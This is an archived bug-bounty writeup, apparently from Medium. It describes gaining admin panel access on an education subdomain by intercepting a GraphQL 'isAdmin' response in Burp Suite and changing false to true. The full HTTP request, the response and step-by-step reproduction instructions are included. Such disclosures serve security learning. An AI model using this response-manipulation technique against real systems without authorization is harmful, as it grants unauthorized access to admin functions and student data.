---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-08_another-admin-panel.md
original_filename: 2021-12-08_another-admin-panel.md
title: Another Admin panel
category: documents
detected_topics:
- command-injection
- graphql
- cors
- api-security
tags:
- imported
- documents
- command-injection
- graphql
- cors
- api-security
language: en
raw_sha256: 90d600072fa13873f81f8504d965f3e302c9f88422eb9b920cd8042d9cadfced
text_sha256: a887e5d3b31fe629069c3e15a66520ae03f5b2c060f33caec9ca418f07db1c7f
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Another Admin panel

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-08_another-admin-panel.md
- Source Type: markdown
- Detected Topics: command-injection, graphql, cors, api-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `90d600072fa13873f81f8504d965f3e302c9f88422eb9b920cd8042d9cadfced`
- Text SHA256: `a887e5d3b31fe629069c3e15a66520ae03f5b2c060f33caec9ca418f07db1c7f`


## Content

---
title: "Another Admin panel"
url: "https://rizwansiddiqu1.medium.com/another-admin-panel-e0489dc76678"
authors: ["Rizwan_siddiqui (@Rizwan_SiDdiqu1)"]
bugs: ["HTTP response manipulation", "Authentication bypass"]
publication_date: "2021-12-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3104
scraped_via: "browseros"
---

# Another Admin panel

Another Admin panel
rizwansiddiqu1
Follow
2 min read
·
Dec 7, 2021

142

1

As-Salaam-Alaikum.(Peace be upon you).

I am back with another writeup I hope you Guys are hunting and earning bounty. This Time I was able to access Admin panel with the help of graphql. let’s start.

I am taking target.com as an example for this writeup. I was testing one by one subdomain of target.com and i come to this subdomain education.target.com. This is some kind of Education page where student can login and see the lecture.

Attack

When I login in as normal user I see the page where login function and student education page is available I open my burp suite and refresh the page to see what are the request made to the server. After that is see that graphql request is made for some reason to api endpoint .

request

POST /api/graphql HTTP/1.1
Host: education.target.com
  User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0
Accept: */*
Cookie: a0:state=YOUR Cookie
{"operationName":"isAdmin","variables":{},"query":"query isAdmin {\n  isAdmin\n}\n"}

I Right Click on that request -> Do intercept -> response to this Request in burp suite

Get rizwansiddiqu1’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Response

HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sat, 04 Sep 2021 04:47:05 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 27
Connection: close
access-control-allow-origin: *
access-control-allow-credentials: true
etag: W/"1b-fPOq3WJkZQ0rkaalpPwLwZziKSQ"
Vary: Accept-Encoding
Strict-Transport-Security: max-age=15724800; includeSubDomains

{"data":{"isAdmin":false}} <-- I just change this to this -> isAdmin":true

And I am able to access the admin panel. there I can add lectures and see the all-student list.

Step to Reproduce
Go to This URL education.target.com
Login with your credential :
After That Refresh the page and capture the request in burp suite forward every request until you see this request :
POST /api/graphql HTTP/1.1
Host: education.target.com
  User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0
Accept: */*
Cookie: a0:state=YOUR Cookie
{"operationName":"isAdmin","variables":{},"query":"query isAdmin {\n  isAdmin\n}\n"}

4. Right Click on that request -> Do intercept -> response to this Request

5. After that you will see this response in Your Burp Suite :

HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sat, 04 Sep 2021 04:47:05 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 27
Connection: close
access-control-allow-origin: *
access-control-allow-credentials: true
etag: W/"1b-fPOq3WJkZQ0rkaalpPwLwZziKSQ"
Vary: Accept-Encoding
Strict-Transport-Security: max-age=15724800; includeSubDomains

{"data":{"isAdmin":false}}

6. Change “isAdmin: false to “isAdmin: true” and send that request

7. Back to your browser You will see the admin panel on your home page.

The main vulnerability lies in graphql. Just because of misconfiguration in graphql implementation an attacker was able to access the admin panel.

Takeaway

Always check each and every request on the login page especially graphql page.

I am not attaching a screenshot of the admin panel page because of company privacy.
